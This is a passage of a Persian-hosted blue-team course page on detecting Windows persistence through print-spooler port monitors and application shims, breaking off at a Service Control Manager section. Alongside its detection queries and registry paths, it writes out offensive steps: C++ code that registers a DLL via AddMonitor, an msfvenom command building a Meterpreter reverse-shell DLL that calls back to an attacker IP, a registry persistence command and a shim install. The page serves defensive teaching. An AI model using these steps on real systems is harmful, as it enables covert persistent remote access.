<!doctype html>
<html lang="fa-IR" dir="rtl" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-BT/Detecting Persistent">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Persistent | مستندات</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://your-docusaurus-test-site.com/t1/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://your-docusaurus-test-site.com/t1/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://your-docusaurus-test-site.com/t1/docs/BT/Detecting Persistent"><meta data-rh="true" name="docusaurus_locale" content="fa"><meta data-rh="true" name="docsearch:language" content="fa"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Persistent | مستندات"><meta data-rh="true" name="description" content="AddMonitor"><meta data-rh="true" property="og:description" content="AddMonitor"><link data-rh="true" rel="icon" href="/t1/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://your-docusaurus-test-site.com/t1/docs/BT/Detecting Persistent"><link data-rh="true" rel="alternate" href="https://your-docusaurus-test-site.com/t1/en/docs/BT/Detecting Persistent" hreflang="en-US"><link data-rh="true" rel="alternate" href="https://your-docusaurus-test-site.com/t1/docs/BT/Detecting Persistent" hreflang="fa-IR"><link data-rh="true" rel="alternate" href="https://your-docusaurus-test-site.com/t1/docs/BT/Detecting Persistent" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/t1/blog/rss.xml" title="مستندات RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/t1/blog/atom.xml" title="مستندات Atom Feed"><link rel="stylesheet" href="/t1/assets/css/styles.1ef40823.css">
<link rel="preload" href="/t1/assets/js/runtime~main.6cba7662.js" as="script">
<link rel="preload" href="/t1/assets/js/main.6dd431d2.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="پرش به مطلب اصلی"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">پرش به مطلب اصلی</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/t1/"><div class="navbar__logo"><img src="/t1/img/logo.svg" alt="مستندات" class="themedImage_ToTc themedImage--light_HNdA"><img src="/t1/img/logo.svg" alt="مستندات" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">مستندات</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/t1/docs/category/pwk">آموزش</a><a class="navbar__item navbar__link" href="/t1/blog">بلاگ</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/opoet7" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="بین حالت تاریک و روشن سوئیچ کنید (الان حالت روشن)" aria-label="بین حالت تاریک و روشن سوئیچ کنید (الان حالت روشن)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="بازگشت به بالا" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/t1/docs/category/pwk">PWK</a><button aria-label="دسته‌بندی برچسب &#x27;PWK&#x27; در نوار کناری را تغییر دهید " type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/t1/docs/category/blueteam-course">BlueTeam Course</a><button aria-label="دسته‌بندی برچسب &#x27;BlueTeam Course&#x27; در نوار کناری را تغییر دهید " type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/t1/docs/BT/Introduction To Blue Team">Introduction To Blue Team</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/t1/docs/BT/CTI">Cyber Threat Intelligence</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/t1/docs/BT/IMS">Incident Management System</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/t1/docs/BT/Centeralize CTI">Centeralize CTI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/t1/docs/BT/Automation">Automation</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/t1/docs/BT/SOAR">SOAR</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/t1/docs/BT/Sigma Rule EDR Integration">Sigma Rule EDR Integration</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/t1/docs/BT/EQL-SIEM">Event Query Language - EQL</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/t1/docs/BT/Detecting Execution">Execution</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/t1/docs/BT/Detecting PE">Privilege Escalation Detection</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/t1/docs/BT/Detecting Evasion">Detecting Evasion</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/t1/docs/BT/Detecting Persistent">Persistent</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/t1/docs/BT/Lateral Movement">Lateral Movement</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/t1/docs/BT/Exfiltration">Detecting Exflitration</a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="نشانگر صفحات"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="صفحه اصلی" class="breadcrumbs__link" href="/t1/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/t1/docs/category/blueteam-course"><span itemprop="name">BlueTeam Course</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Persistent</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">مطالب این صفحه</button></div><div class="theme-doc-markdown markdown"><h1>Persistent</h1><h2 class="anchor anchorWithStickyNavbar_LWe7" id="addmonitor">AddMonitor<a href="#addmonitor" class="hash-link" aria-label="لینک مستقیم به AddMonitor" title="لینک مستقیم به AddMonitor">​</a></h2><p>The <strong>AddMonitor</strong> function installs a local port monitor and links the configuration, data, and monitor files.</p><p>Port Monitor refers to the Windows Print Spooler Service or <code>spoolv.exe</code> in this post. When adding a printer port monitor, a user (or an attacker) is able to add an arbitrary dll that serves as the <em>“monitor”</em>.</p><p>There are essentially two ways to add a port monitor, also known as
your malicious DLL: through the Registry for persistence or a custom
Windows application (<code>AddMonitor</code> function) for immediate dll execution.</p><p>addMonitor.cpp</p><div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&quot;Windows.h&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MONITOR_INFO_2 monitorInfo</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    TCHAR env</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">12</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">TEXT</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Windows x64&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    TCHAR name</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">12</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">TEXT</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;nssMonitor&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    TCHAR dll</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">13</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">TEXT</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;nooranet.dll&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    monitorInfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">pName </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> name</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    monitorInfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">pEnvironment </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> env</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    monitorInfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">pDLLName </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> dll</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">AddMonitor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPBYTE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">monitorInfo</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>nooranet.dll</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p windows/x64/meterpreter/reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.1.49 </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">443</span><span class="token plain"> -f dll </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> nooranet.dll</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detection">Detection<a href="#detection" class="hash-link" aria-label="لینک مستقیم به Detection" title="لینک مستقیم به Detection">​</a></h3><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">event.code </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;3&quot;</span><span class="token plain">  and process.name </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;rundll32.exe&quot;</span><span class="token plain"> </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" src="/t1/assets/images/addmonitor1-64dfaa4d5164b7e9b09514f21097751d.png" width="2556" height="1278" class="img_ev3q"></p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">event.code </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;1&quot;</span><span class="token plain">  and  process.parent.name.text </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;spoolsv.exe&quot;</span><span class="token plain"> </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" src="/t1/assets/images/addmonitor2-b6268efe6dbb75c1a537f2198f75f1ac.png" width="2548" height="1282" class="img_ev3q"></p><p>Additional information</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;HKLM\System\CurrentControlSet\Control\Print\Monitors\Meow&quot;</span><span class="token plain"> /v </span><span class="token string" style="color:#e3116c">&quot;Driver&quot;</span><span class="token plain"> /d </span><span class="token string" style="color:#e3116c">&quot;nooranet.dll&quot;</span><span class="token plain"> /t REG_SZ</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg query </span><span class="token string" style="color:#e3116c">&quot;HKLM\System\CurrentControlSet\Control\Print\Monitors&quot;</span><span class="token plain"> /s</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="hunting-application-shimming">Hunting Application Shimming<a href="#hunting-application-shimming" class="hash-link" aria-label="لینک مستقیم به Hunting Application Shimming" title="لینک مستقیم به Hunting Application Shimming">​</a></h2><p>The Application compatibility toolkit interface can be used to create a new shim database or modify an existing database.</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sdbinst pentestlab.sdb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detection-1">Detection<a href="#detection-1" class="hash-link" aria-label="لینک مستقیم به Detection" title="لینک مستقیم به Detection">​</a></h3><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKLM</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SOFTWARE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows NT</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentVersion</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">AppCompatFlags</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Custom</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKLM</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SOFTWARE</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows NT</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">CurrentVersion</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">AppCompatFlags</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">InstalledSDB</span><span class="token punctuation" style="color:#393A34">\</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="service-controlmanager">Service Control Manager<a href="#service-controlmanager" class="hash-link" aria-label="لینک مستقیم به Service Control Manager" title="لینک مستقیم به Service Control Manager">​</a></h2><p>The service control manager (SCM) is responsible to start and stop  services in windows environments including device drivers and start up  applications</p><p>Security Descriptor Definition Language (SDDL) in order to provide a  textual representation for security descriptors in a more readable  format. Prior to Windows 2000 security descriptors were represented as  hex bytes</p><p>user service right </p><div class="language-bash 